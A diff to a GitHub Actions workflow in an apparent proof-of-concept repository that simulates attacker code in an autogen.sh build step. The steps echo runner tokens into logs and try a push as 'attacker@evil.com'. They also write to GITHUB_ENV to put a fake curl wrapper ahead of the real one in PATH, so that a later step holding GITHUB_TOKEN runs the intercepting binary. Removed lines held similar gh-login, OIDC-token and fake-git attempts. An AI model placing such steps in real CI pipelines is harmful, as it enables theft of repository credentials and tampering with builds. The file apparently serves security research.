@@ -16,51 +16,38 @@ jobs:
       with:
         persist-credentials: false
 
-    - name: Simulate autogen.sh (attacker code)
+    - name: Simulate autogen.sh (attacker code, no GITHUB_TOKEN in env)
       run: |
-        echo "=== 1. Can we git push directly? ==="
+        echo "=== 1. Direct git push ==="
         echo "test" >> rce-test.txt
-        git add rce-test.txt || true
         git config user.email "attacker@evil.com"
         git config user.name "Attacker"
+        git add rce-test.txt
         git commit -m "attacker commit" || true
-        git push origin master 2>&1 || echo "PUSH FAILED (expected with persist-credentials:false)"
+        git push origin master 2>&1 || echo "PUSH_FAILED"
 
         echo ""
-        echo "=== 2. Can we use gh CLI? ==="
-        gh auth status 2>&1 || echo "GH CLI: not authenticated"
+        echo "=== 2. ACTIONS_RUNTIME_TOKEN ==="
+        echo "ACTIONS_RUNTIME_TOKEN=${ACTIONS_RUNTIME_TOKEN:-NOT_FOUND}"
+        echo "ACTIONS_RUNTIME_URL=${ACTIONS_RUNTIME_URL:-NOT_FOUND}"
 
         echo ""
-        echo "=== 3. Can we use GITHUB_TOKEN via gh CLI? ==="
-        echo "${GITHUB_TOKEN:-NOT_SET}" | gh auth login --with-token 2>&1 || echo "GH CLI login: failed"
-
-        echo ""
-        echo "=== 4. ACTIONS_RUNTIME_TOKEN / internal runner tokens ==="
-        echo "ACTIONS_RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:-NOT_FOUND}"
-        echo "ACTIONS_ID_TOKEN_REQUEST_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:-NOT_FOUND}"
-        echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-NOT_FOUND}"
-
-        echo ""
-        echo "=== 5. Can we write to GITHUB_ENV to poison later steps? ==="
-        echo "INJECTED_VAR=pwned_by_attacker" >> $GITHUB_ENV
-        echo "Written to GITHUB_ENV"
-
-        echo ""
-        echo "=== 6. Can we plant a fake 'git' in PATH to intercept later? ==="
+        echo "=== 3. Plant fake curl in PATH via GITHUB_ENV ==="
         mkdir -p /tmp/fakebins
-        cat > /tmp/fakebins/git << 'FAKEGIT'
-        #!/bin/bash
-        echo "[FAKE GIT] called with: $@" >> /tmp/git-intercept.log
-        /usr/bin/git "$@"
-        FAKEGIT
-        chmod +x /tmp/fakebins/git
+        printf '#!/bin/bash\necho "[FAKE CURL] $@" >> /tmp/curl-intercept.log\n/usr/bin/curl "$@"\n' > /tmp/fakebins/curl
+        chmod +x /tmp/fakebins/curl
         echo "PATH=/tmp/fakebins:$PATH" >> $GITHUB_ENV
-        echo "Planted fake git in PATH via GITHUB_ENV"
+        echo "INJECTED=yes_we_are_in" >> $GITHUB_ENV
 
-    - name: Check GITHUB_ENV injection worked
+    - name: Step after autogen (token used here)
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
-        echo "INJECTED_VAR=$INJECTED_VAR"
-        echo "PATH starts with: $(echo $PATH | cut -d: -f1)"
-        echo "git location: $(which git)"
-        git --version
-        cat /tmp/git-intercept.log 2>/dev/null || echo "no intercept log yet"
+        echo "=== Intercepted curl calls? ==="
+        cat /tmp/curl-intercept.log 2>/dev/null || echo "no intercept log"
+        echo ""
+        echo "=== INJECTED var from prev step ==="
+        echo "INJECTED=$INJECTED"
+        echo ""
+        echo "=== Try API call with token ==="
+        curl -sf -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/sonnet-tools/nut-poc | python3 -c "import sys,json; d=json.load(sys.stdin); print('repo name:', d['full_name'], 'permissions:', d.get('permissions','n/a'))" 2>/dev/null || echo "API call failed"
